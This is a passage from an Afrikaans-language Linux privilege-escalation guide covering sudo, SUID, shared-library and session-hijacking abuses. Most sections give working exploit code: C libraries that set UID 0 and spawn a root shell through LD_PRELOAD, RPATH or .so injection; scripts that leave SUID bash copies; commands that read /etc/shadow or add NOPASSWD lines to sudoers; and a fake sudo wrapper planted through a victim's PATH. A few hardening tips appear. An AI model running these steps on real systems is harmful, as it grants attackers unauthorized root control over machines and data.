- Dit is veral nuttig wanneer die bronlêer deur root besit word en nie skryfbaar is nie, maar die omringende `__pycache__`-gids wel skryfbaar is.
- `PYTHONDONTWRITEBYTECODE=1` en `python -B` keer dat Python nuwe `.pyc`-lêers skryf; dit keer **nie** dat dit ’n bestaande, geldige kaslêer laai wat deur ’n aanvaller vervang is nie. Die kritieke grens is of ’n gebruiker met laer voorregte ’n kaslêer kan vervang wat die bevoorregte import sal aanvaar. Python kontroleer tydstempel-/grootte- of hash-metadata voordat dit gekaste bytecode laai. Sien die [Python-importverwysing](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) en [opdragreëldokumentasie](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimale proof-of-concept-struktuur:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Verharding:

- Verseker dat geen gids in die bevoorregte Python-invoerpad skryfbaar is vir gebruikers met lae voorregte nie, insluitend `__pycache__`.
- Oudit die eienaarskap en toestemmings van kasgidse, insluitend bestaande `.pyc`-lêers. Die deaktivering van bytecode-skryfwerk kan die skep van nuwe kaslêers beperk, maar maak nie ’n bestaande vervangbare kaslêer onskadelik nie.
- Behandel skryfbare plaaslike Python-modules en skryfbare kasgidse op dieselfde manier as skryfbare shell-skripte of gedeelde biblioteke wat as root uitgevoer word.

### BASH_ENV behoue via sudo env_keep → root shell

As sudoers `BASH_ENV` behou (bv. `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag benut om arbitrêre kode as root uit te voer wanneer jy ’n toegelate opdrag aanroep.<sup>[[24]](#references)</sup>

- Waarom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en laai daardie lêer as bron voordat dit die teikenskrip uitvoer. Baie sudo-reëls laat toe dat ’n skrip of ’n shell-omhulsel uitgevoer word. As `BASH_ENV` deur sudo behou word, word jou lêer met root-voorregte gelaai.<sup>[[23]](#references)</sup>

- Vereistes:
  - ’n sudo-reël wat jy kan uitvoer (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash-skrip).
  - `BASH_ENV` moet in `env_keep` wees (kontroleer met `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Versterking:
  - Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`; verkies `env_reset`.
  - Vermy shell-wrappers vir opdragte wat deur sudo toegelaat word; gebruik minimale binaries.
  - Oorweeg sudo-I/O-logging en waarskuwings wanneer bewaarde omgewingsveranderlikes gebruik word.

### Terraform via sudo met bewaarde HOME (!env_reset)

Wanneer sudo Terraform as ’n gebruiker met meer voorregte toelaat, is `!env_reset` ’n leidraad om na te gaan watter omgewingsveranderlikes werklik deur daardie spesifieke reël behoue bly. Bevestig die effektiewe `HOME` of `TF_CLI_CONFIG_FILE` voordat jy ’n `.terraformrc` of `terraform.rc` wat deur die oproeper geskryf kan word, as die aktiewe CLI-konfigurasie beskou. ’n `provider_installation.dev_overrides`-inskrywing is slegs van belang as die vaste Terraform-opdrag daardie provider laai en die oproeper die uitvoerbare lêer daarvan in die geselekteerde gids kan plaas.<sup>[[25]](#references)</sup>

- Wys die vereiste provider na ’n skryfbare gids en plaas ’n kwaadwillige plugin met die provider se naam (bv. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform sal die Go plugin-handshake laat misluk, maar voer die payload as root uit voordat dit omval, en laat ’n SUID-shell agter.

### TF_VAR-oorrides + symlink-validasiebypassing

Terraform-veranderlikes kan via `TF_VAR_<name>`-omgewingsveranderlikes verskaf word as die spesifieke sudo-reël dit behou. ’n Bron-symlink-**leesaksie** vereis ook ’n provider wat die skakel volg en die beskermde resultaat na ’n bestemming kopieer wat deur die oproeper gelees kan word. ’n Bestemmings-symlink-**skryfaksie** vereis afsonderlik ’n bestemmingsinskrywing wat deur die oproeper beheer word, en ’n bevoorregte provider wat dit tydens skryf volg; ’n latere geskeduleerde taak is net een moontlike gevolg. Ondersoek die presiese sudo-toekenning, relevante `.tf`-lêers, geselekteerde CLI-konfigurasie en padaienaarskap met leesalleen-opdragte soos `sudo -l`, `stat` en `readlink` voordat jy enige van die roetes toets. Swak leksikale validasies soos `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` los nie symlinks op nie:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform volg die symlink en kopieer die regte `/root/root.txt` na ’n bestemming wat die aanvaller kan lees. Dieselfde benadering kan gebruik word om na bevoorregte paaie te **skryf** deur vooraf bestemmingsymlinks te skep (bv. wat die verskaffer se bestemmingspad binne `/etc/cron.d/` laat wys).

### requiretty / !requiretty

Op sommige ouer verspreidings kan sudo met `requiretty` opgestel word, wat sudo dwing om slegs vanaf ’n interaktiewe TTY te loop. As `!requiretty` gestel is (of die opsie ontbreek), kan sudo vanuit nie-interaktiewe kontekste soos reverse shells, cron jobs of skripte uitgevoer word.

```bash
Defaults !requiretty
```

Dit is nie op sigself ’n direkte kwesbaarheid nie, maar dit vergroot die aantal situasies waarin sudo-reëls misbruik kan word sonder dat ’n volledige PTY nodig is.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

As `sudo -l` `env_keep+=PATH` wys, of ’n `secure_path` met inskrywings wat die aanvaller kan skryf (bv. `/home/<user>/bin`), kan ’n ongekwalifiseerde eksterne command binne die sudo-toegelate teiken oorskadu word.<sup>[[3]](#references)</sup> ’n Ontbrekende effektiewe `secure_path` verdien ook ondersoek **as** die command se sudo-omgewing ’n `PATH` behou wat deur die oproeper beheer word; die blote afwesigheid daarvan bewys nie dat dit wel so is nie. Lees die toegelate script sonder om dit uit te voer, en verifieer dan die presiese RunAs- en argumentreël, die effektiewe command-soekpad, en ’n vroeër skryfbare en deursoekbare gids wat die commandnaam bevat. Verifikasie, `NOEXEC`, shell-builtin-funksies en absolute command-paaie kan die uitkoms verander.

- Vereistes: ’n sudo-reël (dikwels `NOPASSWD`) wat ’n script/binêre lêer uitvoer wat commands sonder absolute paaie aanroep (`free`, `df`, `ps`, ens.), en ’n skryfbare PATH-inskrywing wat eerste deursoek word.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo-uitvoering wat paaie omseil
**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld, in die sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

As ’n **wildcard** gebruik word (\*), is dit selfs makliker:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binêre sonder opdragpad

As die **sudo-toestemming** vir ’n enkele opdrag gegee word **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH-veranderlike te verander

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Hierdie tegniek kan ook gebruik word as ’n **suid**-binary **’n ander opdrag uitvoer sonder om die pad daarna te spesifiseer (kontroleer altyd die inhoud van ’n vreemde SUID-binary met** _**strings**_**)**.

[Payload-voorbeelde om uit te voer.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-binary met opdragpad

As die **suid**-binary **’n ander opdrag uitvoer deur die pad daarna te spesifiseer**, kan jy probeer om ’n **funksie uit te voer** met dieselfde naam as die opdrag wat die suid-lêer aanroep.

As ’n suid-binary byvoorbeeld _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en uit te voer:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Dan, wanneer jy die suid-binary aanroep, sal hierdie funksie uitgevoer word

### Pasgemaakte SUID-kopieerwrappers

’n SUID-hulpmiddel wat deur root besit word en bron- en bestemmingspaaie aanvaar, kan twee verskillende vertrouensgrense oorsteek. As dit ’n shell-opdrag uit enige argument saamstel (byvoorbeeld deur ’n saamgestelde `cp`-opdrag aan `system()` deur te gee), kan shell-metakarakters ’n ander opdrag met sy effektiewe voorregte uitvoer. Selfs as dit `cp` veilig sonder ’n shell aanroep, kan ’n onbeperkte bestemming arbitrêre bevoorregte skryftoegang tot lêers soos `/etc/passwd` moontlik maak. Gaan die wrapper se argumenthantering, effektiewe UID-gedrag, bestemmingsbeperkings en of die gekopieerde lêer inhoud behou wat deur die aanroeper beheer word, na; ’n generiese `cp`-fout of SUID-bit alleen bewys nie dat enige van die twee paaie bestaan nie. Lys die binary en sy toestemmings passief voordat jy dit handmatig toets.

### Skryfbare script wat deur ’n SUID-wrapper uitgevoer word

’n Algemene wanopstelling in pasgemaakte toepassings is ’n SUID-binary-wrapper wat deur root besit word en ’n script uitvoer, terwyl gebruikers met lae voorregte die script self kan wysig.

Tipiese patroon:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

As /usr/local/bin/backup.sh skryfbaar is, kan jy payload-opdragte byvoeg en dan die SUID-wrapper uitvoer:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Vinnige kontroles:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Hierdie aanvalspad kom veral algemeen voor in "maintenance"/"backup"-wrappers wat in `/usr/local/bin` versprei word.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD**-omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so-lêers) te spesifiseer wat die loader voor al die ander laai, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflaai van ’n biblioteek.

Om stelselsekuriteit te handhaaf en te voorkom dat hierdie kenmerk misbruik word, veral met **suid/sgid**-uitvoerbare lêers, dwing die stelsel egter sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruiker-ID (_ruid_) nie met die effektiewe gebruiker-ID (_euid_) ooreenstem nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is, vooraf gelaai.

Voorregte-eskalasie kan plaasvind as jy opdragte met `sudo` kan uitvoer en die uitvoer van `sudo -l` die stelling **env_keep+=LD_PRELOAD** bevat. Hierdie konfigurasie laat die **LD_PRELOAD**-omgewingsveranderlike behoue bly en herken word, selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik tot die uitvoering van arbitrêre kode met verhoogde voorregte kan lei.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Stoor as **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Stel dit dan saam met:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Laastens, **eskaleer voorregte deur te hardloop**

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> ’n Soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH**-omgewingsveranderlike beheer, omdat hy die pad beheer waarin na biblioteke gesoek gaan word.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Wanneer jy ’n binary met **SUID**-toestemmings teëkom wat ongewoon lyk, is dit goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Byvoorbeeld, wanneer jy ’n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ teëkom, dui dit op ’n moontlikheid vir uitbuiting.

Om dit uit te buit, skep jy ’n C-lêer, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Hierdie kode is daarop gemik om, sodra dit saamgestel en uitgevoer is, voorregte te eskaleer deur lêertoestemmings te manipuleer en ’n shell met verhoogde voorregte uit te voer.

Stel die bogenoemde C-lêer saam in ’n shared object (.so)-lêer met:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Laastens behoort die uitvoering van die betrokke SUID-binêre die exploit te aktiveer, wat moontlike stelselkompromittering kan veroorsaak.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Noudat ons ’n SUID-binêre lêer gevind het wat ’n library laai vanaf ’n gids waarheen ons kan skryf, laat ons die library in daardie gids met die nodige naam skep:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

As jy 'n fout kry soos

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

dit beteken dat die biblioteek wat jy gegenereer het 'n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binêre programme wat 'n aanvaller kan uitbuit om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente** in 'n opdrag kan inspuit.

Die projek versamel wettige funksies van Unix-binêre programme wat misbruik kan word om uit beperkte shells te ontsnap, voorregte te eskaleer of verhoogde voorregte te behou, lêers oor te dra, bind- en reverse shells te begin, en ander post-exploitation-take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die nutsding [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit 'n manier vind om enige sudo-reël uit te buit.

### Hergebruik van Sudo-tokens

In gevalle waar jy **sudo-toegang** het, maar nie die wagwoord nie, kan jy voorregte eskaleer deur **te wag totdat 'n sudo-opdrag uitgevoer word en dan die sessietoken te kaap**.<sup>[[18]](#references)</sup>

Vereistes om voorregte te eskaleer:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer **binne die afgelope 15 minute** (dit is by verstek die geldigheidsduur van die sudo-token, wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is beskikbaar (jy moet dit kan oplaai)

(Jy kan `ptrace_scope` tydelik aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, of dit permanent doen deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` in te stel.)

As aan al hierdie vereistes voldoen word, **kan jy voorregte eskaleer met:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **eerste exploit** (`exploit.sh`) skep die binêre lêer `activate_sudo_token` in _/tmp_. Jy kan dit gebruik om **die sudo-token in jou sessie te aktiveer** (jy kry nie outomaties 'n root-shell nie; voer `sudo su` uit):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Die **tweede exploit** (`exploit_v2.sh`) sal ’n sh-dop in _/tmp_ skep wat **aan root behoort en setuid het**.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- The **third exploit** (`exploit_v3.sh`) sal **'n sudoers-lêer skep** wat **sudo-tokens permanent maak en alle gebruikers toelaat om sudo te gebruik**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

As jy **skryftoestemmings** in die vouer of op enige van die geskepte lêers daarin het, kan jy die binêre [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **’n sudo-token vir ’n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy ’n shell as daardie gebruiker met PID 1234 het, kan jy **sudo-voorregte verkry** sonder om die wagwoord te hoef te ken deur die volgende te doen:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel op wie `sudo` kan gebruik en hoe. Hierdie lêers **kan by verstek net deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer kan **lees**, kan jy moontlik **interessante inligting bekom**, en as jy enige lêer kan **skryf**, sal jy **voorregte kan eskaleer**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

As jy kan skryf, kan jy hierdie toestemming misbruik.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Nog ’n manier om hierdie toestemmings te misbruik:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Daar is alternatiewe vir die `sudo`-program, soos `doas` vir OpenBSD. Onthou om die konfigurasie daarvan by `/etc/doas.conf` na te gaan.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

As `doas` 'n redigeerder of tolk toelaat, kyk vir GTFOBins-styl ontsnappings:

```bash
doas vim
:!/bin/sh
```

’n `doas`-reël wat root-toegang verleen vir die oorspronklike Python-gebaseerde `dstat` verdien ook ’n hersiening van die plugin-pad. Die [handleiding](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) en [bron](https://github.com/dstat-real/dstat/blob/master/dstat) noem `/usr/share/dstat/` en `/usr/local/share/dstat/` onder die liggings vir `dstat_*.py`-plugins. As die huidige gebruiker kan skryf na en soek in ’n ligging wat deur die geïnstalleerde bouweergawe gebruik word, kan ’n gekose plugin met die `doas` RunAs-identiteit loop. Bevestig die effektiewe reël, plugin-opsoekgedrag in daardie bouweergawe, die toestemmings of ACL’s van die gids en ouergidse, en of die aanroeper ’n plugin kan kies; ’n `dstat`-reël of skryfbare gids alleen is net ’n leidraad. Ander `dstat`-implementasies kan verskillende plugin-stelsels gebruik. Inspekteer metadata passief sonder om ’n plugin te laai.

### Sudo Hijacking

As jy weet dat ’n **gebruiker gewoonlik aan ’n masjien koppel en `sudo` gebruik** om voorregte te eskaleer, en jy ’n shell binne daardie gebruiker se konteks verkry het, kan jy **’n nuwe sudo-uitvoerbare lêer skep** wat jou kode as root en daarna die gebruiker se opdrag uitvoer. Dan kan jy **die gebruiker se `$PATH` wysig** (byvoorbeeld deur die nuwe pad by `.bash_profile` te voeg), sodat jou sudo-uitvoerbare lêer loop wanneer die gebruiker sudo uitvoer.

Let daarop dat as die gebruiker ’n ander shell gebruik (nie bash nie), jy ander lêers sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc` en `~/.bash_profile`. Jy kan nog ’n voorbeeld in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) vind.

Of deur iets soos die volgende uit te voer:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Gedeelde biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Gewoonlik bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waarin **biblioteke** **gesoek** sal word. Die inhoud van `/etc/ld.so.conf.d/libc.conf` is byvoorbeeld `/usr/local/lib`. **Dit beteken dat die stelsel na biblioteke in `/usr/local/lib` sal soek**.

As **’n gebruiker om enige rede skryftoestemmings** het vir enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer in die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf`, kan hy dalk voorregte eskaleer.\
Kyk na **hoe om hierdie wanopstelling te exploit** op die volgende bladsy:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Deur die lib na `/var/tmp/flag15/` te kopieer, sal die program dit op hierdie plek gebruik, soos in die `RPATH`-veranderlike gespesifiseer.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Skep dan ’n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities bied **'n subset van die beskikbare root-voorregte aan 'n proses**. Dit verdeel root-**voorregte effektief in kleiner en onderskeibare eenhede**. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volledige stel voorregte verminder, wat die risiko's van uitbuiting verlaag.\
Lees die volgende bladsy om **meer te wete te kom oor capabilities en hoe om dit te misbruik**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Gidstoestemmings

In 'n gids beteken die **"uitvoer"-bis** dat die betrokke gebruiker die gids met "**cd**" kan binnegaan.\
Die **"lees"-bis** beteken die gebruiker kan die **lêers** lys, en die **"skryf"-bis** beteken die gebruiker kan nuwe **lêers** **skrap** en **skep**.

## ACLs

Access Control Lists (ACLs) is die sekondêre laag van diskresionêre toestemmings, wat die **tradisionele ugo/rwx-toestemmings kan oorheers**. Hierdie toestemmings verbeter beheer oor toegang tot lêers of gidse deur regte aan spesifieke gebruikers wat nie die eienaars is of deel van die groep is nie, toe te staan of te weier. Hierdie vlak van **fynkorreligheid verseker meer presiese toegangsbeheer**. Verdere besonderhede is [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux) beskikbaar.<sup>[[19]](#references)</sup>

**Gee** gebruiker "kali" lees- en skryftoestemmings vir 'n lêer:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Kry** lêers met spesifieke ACLs vanaf die stelsel:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Versteekte ACL-agterdeur in sudoers-drop-ins

’n Algemene verkeerde konfigurasie is ’n lêer in `/etc/sudoers.d/` wat deur root besit word en modus `440` het, maar steeds via ACL skryftoegang aan ’n gebruiker met lae voorregte verleen.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

As jy iets soos `user:alice:rw-` sien, kan die gebruiker ’n sudo-reël byvoeg ondanks beperkende modusbits:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Dit is ’n ACL-persistensie-/privesc-pad met ’n groot impak, omdat dit maklik misgekyk word wanneer hersienings net op `ls -l` staatmaak.

## Oop shell-sessies

Toegang tot GNU Screen-sessies tussen gebruikers hang af van die **lopende sessie se konfigurasie en ACL**, nie net van die weergawe nie. [GNU Screen se dokumentasie](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) meld dat dit met multiuser-ondersteuning gebou moet wees; `multiuser on` en ’n `acladd`-toekenning of geskikte `aclchg`-toekenning laat ’n ander gebruiker toe om aan te sluit. [Die handleiding vereis ook setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) vir die opsoek van ’n sessie tussen gebruikers. ’n Sigbare sok wat deur root besit word, of ’n SUID-`screen`-binêre, bewys op sigself nie dat ’n root-shell toeganklik is nie. Bevestig dat die lewendige sessie multiuser is, die huidige gebruiker effektiewe invoer-/opdragtoestemming het, en die shell in daardie sessie as die bevoorregte eienaar loop voordat jy dit as ’n eskalasie beskou.

### screen sessions hijacking

**Lys screen-sessies**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Sokkel-liggings (sommige stelsels stel een as ’n simboliese skakel na die ander bloot): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Koppel aan ’n sessie**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Dit was ’n probleem met **ou tmux-weergawes**. Ek kon nie as ’n gebruiker sonder bevoorregte toegang ’n tmux-sessie (v2.1) hijack wat deur root geskep is nie.

**Lys tmux-sessies**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket-liggings (sommige stelsels stel een as 'n simboliese skakel na die ander bloot) - tmux-sessies kaap: tmux -S /tmp/dev sess ls Lys met daardie socket; jy kan 'n tmux-sessie in daardie socket begin...](<../../images/image (837).png>)

**Heg aan 'n sessie**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Kyk na die **Valentine box from HTB** vir ’n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

